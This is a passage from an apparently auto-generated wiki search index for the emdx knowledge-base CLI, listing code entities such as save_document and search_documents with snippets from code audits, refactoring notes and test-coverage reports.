PMI=5.8)</li> </ul>"},{"location":"entities/safeupdatetask/","title":"_safe_update_task","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/safeupdatetask/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (A) COULD MOVE TO A HOOK</p> <p>...on-end.sh<code>already does</code>emdx task done<code>. The launcher duplicates this by calling</code>_safe_update_task(status=\"done\")<code>or</code>_safe_update_task(status=\"failed\")<code>. **This is genuine duplication.** The launcher's</code>_safe_update_task` calls could be eliminated IF the hooks r...</p> </li> <li> <p>#6516 Any removal Phase 4: Command/Model TypedDicts   Section: Files with intentional <code>Any</code> usage (unchanged)</p> <ul> <li><code>emdx/commands/delegate.py</code>: <code>**kwargs: Any</code> in <code>_safe_create_task</code>, <code>_safe_update_task</code>, <code>_safe_update_execution</code> - forwards to typed functions</li> </ul> </li> <li> <p><code>emdx/models/tasks.py</code>: <code>update_task(task_id: int, **kwargs: Any)</code> - accepts dynamic column updates -...</p> </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: delegate.py</p> <p>...--------| | <code>_safe_create_task</code> | <code>**kwargs: Any</code> | \u274c No | Forwarding pattern | | <code>_safe_update_task</code> | <code>**kwargs: Any</code> | \u274c No | Forwarding pattern | | <code>_safe_update_execution</code> | <code>**kwargs: Any</code> | \u274c No | Forwarding pattern |</p> </li> <li> <p>#6381 Codebase Bug Audit 2026-02-15 [8/10]   Section: GOOD Patterns Observed</p> <ol> <li>Safe wrapper functions:</li> </ol> </li> <li> <p><code>emdx/commands/delegate.py:50-77</code> - <code>_safe_create_task</code>, <code>_safe_update_task</code> explicitly prevent delegate failures</p> </li> <li> <p>#6294 DEBT-19: Add missing test coverage for delegate command   Section: Test Coverage Added</p> <p>...over items</p> </li> <li> <p>TestSafeTaskHelpers (5 tests): Tests for <code>_safe_create_task</code> and <code>_safe_update_task</code></p> </li> <li> <p>#6280 Delegate: DEBT-5: Fix silent exception handlers   Section: Files Modified</p> <p>...5-76)</p> </li> <li>Added <code>import logging</code> and <code>logger = logging.getLogger(__name__)</code></li> <li><code>_safe_update_task</code>: Now logs failed task updates with task ID</li> <li> <p><code>_safe_update_execution</code>: Now logs failed execution updates with exec ID</p> </li> <li> <p>#6279 Delegate: DEBT-8: Standardize CLI interfaces. Standardize doc_id param   Section: 2. Fixed Silent Failures (3 locations)</p> File Line Change <code>delegate.py:64</code> <code>_safe_update_task</code> Now logs: <code>delegate: failed to update task {id}: {error}</code> <code>delegate.py:75</code> <code>_safe_update_execution</code> Now logs: `delegate: failed to update execution {id}:... </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> <p>...ine | Context | |------|------|---------| | <code>emdx/commands/delegate.py</code> | 64-65 | <code>_safe_update_task</code> - silently ignores task update failures | | <code>emdx/commands/delegate.py</code> | 75-76 | <code>_safe_update_execution</code> - silently ignores execution update failures | | `emdx/co...</p> </li> </ul>"},{"location":"entities/safeupdatetask/#related-entities","title":"Related Entities","text":"<ul> <li><code>_safe_update_execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.7)</li> <li><code>_safe_create_task</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.2)</li> <li><code>subprocess.run</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>emdx/commands/status.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>emdx/__init__.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>emdx/utils/logging_utils.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>--model</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>emdx/ui/command_palette/palette_screen.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.4)</li> <li><code>--doc</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.4)</li> </ul>"},{"location":"entities/save/","title":"save","text":"<p>Type: heading | Mentioned in: 17 documents | First seen: 2025-07-07</p>"},{"location":"entities/save/#documents-17","title":"Documents (17)","text":"<ul> <li> <p>#6653 Delegate: README Rewrite - Minimal Prose / Max Examples [6/10]   Section: emdx</p> <p>Persistent memory for AI agents. Save research, run parallel agents, track tasks \u2014 all in local SQLite.</p> </li> <li> <p>#6533 EMDX Future Directions: Agent-First Design [1/4]   Section: 2. Context Loss Between Sessions</p> </li> <li>Documents are saved but not structured for resumption</li> <li>Task log exists but is task-scoped, not session-scoped</li> <li> <p>No \"memory\" of what approaches were tried and failed</p> </li> <li> <p>#6502 None Type Analysis [1/7]   Section: emdx/commands/delegate.py</p> </li> <li> <p>#6398 Delegate synthesis [synthesis]   Section: Actionable Recommendations</p> <p>...ardize structured error output with error codes</p> </li> <li> <p>Migrate high-traffic commands: <code>save</code>, <code>find</code>, <code>view</code>, <code>tag</code></p> </li> <li> <p>#6383 Strategy: EMDX as Agent Workspace   Section: The Shift</p> <p>...onsumes it.</p> </li> <li><code>prime</code>/<code>status</code> \u2014 session bootstrapping for Claude Code.</li> <li> <p><code>save</code>/<code>find</code>/<code>tag</code> \u2014 still useful to humans, but increasingly as a way to read what Claude Code produced.</p> </li> <li> <p>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/)   Section: Top 15 Worst Offenders (Ranked by Severity)</p> <p>...eanup with nested safety checks | | 77.6 | 151 | 5 | <code>commands/core.py:186</code> | <code>save()</code> | Many input sources (file, stdin, text) with nested validation | | 73.0 | 125 | 5 | <code>services/document_merger.py:65</code> | <code>find_merge_candidates()</code> | Pairwise c...</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 1. Command Redundancy - HIGH IMPACT</p> <p>Duplicate tagging commands:</p> </li> <li><code>--auto-tag</code> and <code>--suggest-tags</code> flags on <code>save</code> command</li> <li><code>emdx tag add --auto</code> and <code>emdx tag add --suggest</code></li> <li>Same functionality in two places</li> <li> <p>Suggestion: Keep only on <code>tag add</code>, remove from <code>save</code></p> </li> <li> <p>#6218 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: 1. Inconsistent Argument Naming Across Commands</p> Command Argument Inconsistency <code>save</code> <code>-t/--title</code> Title flag <code>find</code> <code>-t/--tags</code> Same <code>-t</code> means different thing! <code>cascade add</code> <code>-t/--title</code> Title flag <code>cascade add</code> `-s/--stag... </li> <li> <p>#6139 Delegate: Read gameplan by running: emdx view 6097. Implement the Cont [1/7]   Section: Contextual Save Feature Implementation</p> <p>Implemented the Contextual Save feature (duplicate prevention on save) as described in gameplan #6097.</p> </li> <li> <p>#292 Claude Export Wrapper Documentation</p> <p>The <code>/export</code> command in Claude Code copies the entire conversation to your clipboard. This wrapper script captures that clipboard content and allows you to:</p> </li> <li>Save it to your emdx knowledge base</li> <li> <p>Create a GitHub Gist from the conversation</p> </li> <li> <p>#295 EMDX Surface Area Reduction Plan</p> <p>Reduce token usage and complexity by consolidating redundant commands into a single, flexible <code>save</code> command.</p> </li> <li> <p>#6776 Auto-Wiki Architecture \u2014 Synthesized Research   Section: Key Design Decisions</p> <p>...| Same Python stack, no Node.js | | Incremental updates | $0 staleness marking on save, pay-per-refresh | User controls cost | | Privacy | 3-layer: regex \u2192 LLM prompt gate \u2192 post-scan | Casual remarks filtered during synthesis |</p> </li> <li> <p>#6745 Wiki Generation Architecture Research [2/10]</p> <p>Research saved as emdx #6743. Here's the executive summary:</p> </li> <li> <p>#6158 Delegate: analysis [5/5]   Section: Key Features</p> </li> <li>Save: Files, stdin, direct text \u2192 <code>emdx save</code></li> <li>Search: Full-text FTS5 search \u2192 <code>emdx find</code></li> <li>View/Edit: Document lifecycle management</li> <li> <p>Tags: Emoji-based tagging with text aliases</p> </li> <li> <p>#267 Claude Implementation Comparison   Section: \ud83d\udcca Feature Comparison Matrix</p> <p>...-|-----------------|----------------------|-------------------|--------------| | save | \u2705 Files to DB | \u2705 Inherits from base | \u274c | \u274c | | find | \u2705 Basic search | \u2705 Optimized search | \u274c | \u274c | | view | \u2705 By ID/title/project | \u2705 Inherits | \u274c | \u2705...</p> </li> <li> <p>#277 CLAUDE-KNOWLEDGE-MVP   Section: What We're Building (Keep It Simple!)</p> <ol> <li>Save: <code>claude-save &lt;file&gt;</code> or <code>claude-clip</code> (from clipboard)</li> </ol> </li> <li>Find: <code>claude-find &lt;search&gt;</code> or <code>claude-recent</code> </li> <li>View: <code>claude-view &lt;id&gt;</code> with tab completion</li> </ul>"},{"location":"entities/save/#current-state","title":"Current State","text":""},{"location":"entities/save/#function-_save_output_fallback-line-196","title":"Function: <code>_save_output_fallback</code> (line 196)","text":"<p>```python def _save_output_fallback(     output_file: Path,     output_content: str | None,     title: str,     tags: list[str], ) -&gt; int...</p>"},{"location":"entities/save/#1-core-knowledge-base","title":"1. Core Knowledge Base","text":""},{"location":"entities/save/#related-entities","title":"Related Entities","text":"<ul> <li><code>verdict: necessary (both)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>verdict: necessary (both param and return)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>verdict: n/a</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>verdict: both necessary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>validate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typer command:</code>view<code>(lines 772-852)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typer command:</code>save<code>(lines 186-337)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typer command:</code>find<code>(lines 340-551)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typer command:</code>edit<code>(lines 928-1043)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typer command:</code>delegate<code>(lines 983-1331)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/savedocument/","title":"save_document","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/savedocument/#documents-8","title":"Documents (8)","text":"<ul> <li>#6714 Wiki Generation Architecture Research [10/10]   Section: Design Principles Applied <p>...**: <code>explore</code> clustering for topic detection, <code>synthesis_service</code> for generation, <code>save_document</code> for storage</p> </li> <li> <p>Lazy-loaded command: Registered in <code>LAZY_SUBCOMMANDS</code> to avoid import cost on startup...</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Architecture Notes</p> <p>...worktree<code>,</code>cleanup_worktree<code>from</code>utils/git.py`</p> </li> <li>Document ops: <code>get_document</code>, <code>save_document</code> from <code>database/documents.py</code></li> <li> <p>Task model: <code>create_task</code>, <code>update_task</code> from <code>models/tasks.py</code>...</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> <p>...t directly from <code>database/</code>:</p> </li> <li><code>cascade.py</code> imports <code>cascade_db</code>, <code>get_document</code>, <code>save_document</code></li> <li><code>status.py</code>, <code>analyze.py</code>, <code>prime.py</code> import <code>db_connection</code> directly</li> <li> <p><code>recipe.py</code> imports <code>get_document</code>, <code>search_documents</code></p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 1. SQL Query Duplication</p> <p>Examples of duplicated SQL:</p> </li> <li><code>save_document</code>: lines 88-114 duplicate lines 32-49 in documents.py</li> <li><code>get_document</code>: lines 122-146 duplicate lines 52-101 in documents.py  </li> <li> <p><code>delete_document</code>: lines 187-214 dupl...</p> </li> <li> <p>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]   Section: \u2705 Good Patterns Observed</p> <ul> <li>Document operations: <code>save_document</code>, <code>get_document</code>, <code>delete_document</code> \u2014 clear CRUD naming</li> </ul> </li> <li>Task operations: <code>create_task</code>, <code>get_task</code>, <code>update_task</code>, <code>delete_task</code> \u2014 consistent</li> <li> <p>**Execution tra...</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>...eted_documents<code>,</code>list_documents<code>,</code>purge_deleted_documents<code>,</code>restore_document<code>,</code>save_document<code>,</code>update_document`</p> </li> <li> <p><code>emdx/models/documents.py:21</code> - unused import: <code>search_documents</code></p> </li> <li> <p>#6222 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: \ud83d\udfe1 MEDIUM: Missing Edge Case Tests</p> </li> <li><code>save_document</code> edge cases: Very large content (&gt;1MB), Unicode/emoji in title, NULL project</li> <li> <p><code>search_documents</code> edge cases: Empty query, SQL injection attempts, FTS special...</p> </li> <li> <p>#6208 Delegate: Fix PR #449 (Dream Journal): Needs cleanup and tests. Review [3/8]   Section: Changes Made</p> </li> <li>Removed unused imports in <code>emdx/commands/dream.py</code>:</li> <li><code>from rich.table import Table</code> - imported but never used</li> <li><code>from ..models.tags import add_tags_to_document</code> - imported but <code>save_document</code> already handles tags</li> </ul>"},{"location":"entities/savedocument/#document-operations","title":"Document Operations","text":""},{"location":"entities/savedocument/#code-cleanup","title":"Code Cleanup","text":""},{"location":"entities/savedocument/#related-entities","title":"Related Entities","text":"<ul> <li><code>delete_document</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>create_task</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>*service</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>get_worktrees()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>get_document</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>askservice</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>services/embedding_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>search_documents</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>db_connection</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>update_task</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/search/","title":"search","text":"<p>Type: heading | Mentioned in: 13 documents | First seen: 2025-07-07</p>"},{"location":"entities/search/#documents-13","title":"Documents (13)","text":"<ul> <li> <p>#6439 Delegate: Update CLAUDE.md: In the Essential Commands section (around  [3/3]</p> <p>Updated CLAUDE.md Essential Commands section to document new hybrid search options:</p> </li> <li> <p>#276 CLAUDE-KNOWLEDGE-SYSTEM-DESIGN   Section: Claude Knowledge Management System Design</p> </li> <li> <p>#160 Claude Hybrid Architecture - Best of Both Worlds   Section: Phase 1: Enhanced Stored Procedures</p> <p>...ve' THEN             v_result := claude_api.save_document(p_params);         WHEN 'search' THEN             v_result := claude_api.search_documents(p_params);         WHEN 'view' THEN             v_result := claude_api.view_document(p_params);         WHE...</p> </li> <li> <p>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/search/#vision","title":"Vision","text":"<p>A fast, searchable system for managing markdown files used in Claude conversations. Think of it as \"personal documentation\" that grows with every interaction.</p>"},{"location":"entities/search/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Functions with ZERO Callers Outside Their Own File</p> <p>...ervices/embedding_service.py<code>|</code>embed_text<code>| **NO** | yes, by</code>embed_document<code>,</code>search<code>, etc. | Could be made private | |</code>services/hybrid_search.py<code>|</code>normalize_fts5_score<code>| **NO** | yes, by</code>HybridSearch.search<code>| Could be made private | |</code>service...</p> <ul> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 1. MODULES WITH 0% TEST COVERAGE (CRITICAL)</p> <p>...| \ud83d\udd34 CRITICAL | 7 public functions | Test <code>ask_question</code>, <code>get_context</code>, <code>semantic_search</code> | | <code>commands/cascade.py</code> | \ud83d\udd34 CRITICAL | 14 public functions | Test full cascade pipeline: add\u2192process\u2192advance\u2192runs | | <code>commands/executions.py</code> | \ud83d\udd34 CRITICAL | 10 p...</p> </li> <li> <p>#6760 Wiki Generation Architecture: GitBook + Dendron Research [synthesis]   Section: Executive Summary</p> <p>This research evaluated two leading documentation systems \u2014 GitBook (cloud-hosted, AI-native) and Dendron (VS Code, hierarchy-first) \u2014 to inform the architecture of emdx's...</p> </li> <li> <p>#6737 Delegate: Research Obsidian Publish specifically \u2014 the transformation  [4/5]</p> <p>Now I have comprehensive information across all dimensions. Let me compile and output the research.</p> </li> <li> <p>#6730 Wiki Generation Architecture Research [5/10]</p> <p>Research complete. Saved as emdx #6722. Here's the summary:</p> </li> <li> <p>#6386 Delegate: Research how Claude Code specifically works as an agent \u2014 wh [3/4]   Section: Executive Summary</p> <p>This research examines Claude Code's architecture, constraints, and native features to understand how emdx can best integrate with or differentiate from Anthropic's native capabil...</p> </li> <li> <p>#6300 Delegate: DEBT-27: Add async test coverage for UI components. The audi   Section: DEBT-27: Add Async Test Coverage for UI Components</p> <p>...ns in:</p> </li> <li>document_browser_presenter.py (14 tests): load_documents, pagination, search, expand/collapse, CRUD operations, tag management</li> <li>cascade_view.py (3 tests): initialization, stage navigation, view mode switching  </li> <li> <p>document_list.py (3...</p> </li> <li> <p>#6158 Delegate: analysis [5/5]   Section: Project Overview</p> </li> <li>Full-text searchable personal knowledge base</li> <li>AI-powered task delegation and autonomous execution</li> <li>TUI (Terminal User Interface) browser for navigation</li> <li> <p>Git integration for project-aware document management</p> </li> <li> <p>#267 Claude Implementation Comparison   Section: \ud83d\udcca Feature Comparison Matrix</p> <p>...| | save | \u2705 Files to DB | \u2705 Inherits from base | \u274c | \u274c | | find | \u2705 Basic search | \u2705 Optimized search | \u274c | \u274c | | view | \u2705 By ID/title/project | \u2705 Inherits | \u274c | \u2705 By ID/name | | list | \u2705 All docs | \u274c | \u274c | \u2705 All docs | | recent | \u2705 B...</p> </li> <li> <p>#26 FZF Interactive Claude List v1 Plan   Section: FZF Interactive Claude List (cla) - Minimal v1 Plan</p> </li> <li>Browse documents with arrow keys</li> <li>Live preview in split pane</li> <li>Search by typing (searches ID, title, project)</li> <li>Enter to view document</li> <li>e to edit in nvim/editor</li> <li>ESC to cancel</li> </ul>"},{"location":"entities/search/#core-purpose","title":"Core Purpose","text":""},{"location":"entities/search/#smart-minimal-v1-features","title":"Smart Minimal v1 Features","text":""},{"location":"entities/search/#related-entities","title":"Related Entities","text":"<ul> <li><code>why this design</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>core database</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>services/similarity.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>hugo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>hierarchy</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>commands/executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>services/embedding_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> <li><code>minimal</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> <li><code>services/health_monitor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.7)</li> <li><code>services/ask_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.7)</li> </ul>"},{"location":"entities/searchdocuments/","title":"search_documents","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-13</p>"},{"location":"entities/searchdocuments/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6432 Any/None typing audit [1/5]   Section: search.py</p> <p>...ed Replacement | |----------|-----------|--------------|----------------------| | <code>search_documents</code> | <code>params: list[str \\| int]</code> local, <code>raw: dict[str, Any]</code> local | Partial | <code>params</code> already typed; <code>raw</code> is pre-cast intermediate - acceptable |</p> </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing   Section: Implementation Tasks</p> <p>Implementation flow:</p> </li> <li>Parse filters \u2192 build query</li> <li>Execute search via <code>search_documents()</code> + <code>search_by_tags()</code></li> <li>Score documents using <code>_calculate_document_score()</code> (extract as standalone function)</li> <li>Sort by score, take top <code>--limit</code></li> <li> <p>Fetch full co...</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> <p>...<code>prime.py</code> import <code>db_connection</code> directly</p> </li> <li> <p><code>recipe.py</code> imports <code>get_document</code>, <code>search_documents</code></p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 1. SQL Query Duplication</p> <p>...py  </p> </li> <li><code>delete_document</code>: lines 187-214 duplicate lines 269-313 in documents.py</li> <li> <p><code>search_documents</code>: lines 320-355 duplicate lines 40-131 in search.py</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>...ave_document<code>,</code>update_document`</p> </li> <li> <p><code>emdx/models/documents.py:21</code> - unused import: <code>search_documents</code></p> </li> <li> <p>#6222 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: \ud83d\udfe1 MEDIUM: Missing Edge Case Tests</p> <p>...dge cases**: Very large content (&gt;1MB), Unicode/emoji in title, NULL project</p> </li> <li><code>search_documents</code> edge cases: Empty query, SQL injection attempts, FTS special characters (quotes, asterisks)</li> <li> <p><code>delete_document</code>: Already deleted documents, cascade delete wi...</p> </li> <li> <p>#6214 CI Fix: PR #454 Semantic Find Tests   Section: PR #454 CI Fix - Semantic Find Tests</p> <p>...uced hybrid search as the default mode for <code>emdx find</code>. The existing tests mocked <code>search_documents</code>, but hybrid search bypasses this function entirely, calling <code>HybridSearchService.search()</code> instead. This caused 4 tests to fail:</p> </li> <li><code>test_find_basic</code></li> <li> <p>`test_find_no...</p> </li> <li> <p>#6212 Delegate: Sprint PR Fixes [8/8]   Section: PR #454 (Semantic Find) - CRITICAL</p> <p>Problem: The find command was updated to use hybrid search by default. The tests mock <code>search_documents</code> but the hybrid path uses <code>HybridSearchService</code> directly, bypassing the mock.</p> </li> <li> <p>#6152 PR Review: #454 Semantic Find Upgrade   Section: Issues \ud83d\udea8</p> <p>Root cause: Tests mock <code>search_documents</code> but the new hybrid path bypasses this mock entirely. When <code>use_hybrid=True</code>, it calls <code>HybridSearchService.search()</code> which isn't mocked.</p> </li> </ul>"},{"location":"entities/searchdocuments/#related-entities","title":"Related Entities","text":"<ul> <li><code>recommended tests</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>list_documents</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>hybridsearchservice.search()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>test_find_json_output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>test_find_ids_only</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>test_find_basic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>delete_document</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>--mode keyword</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>save_document</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>askservice</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/security-fix-command-injection-in-delegate-each/","title":"security fix: command injection in delegate --each","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2026-02-14</p>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#documents-12","title":"Documents (12)","text":"<ul> <li>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands </li> </ul>"},{"location":"entities/security-fix-command-injection-in-delegate-each/#security-fix-command-injection-in-delegate-each_1","title":"Security Fix: Command Injection in delegate 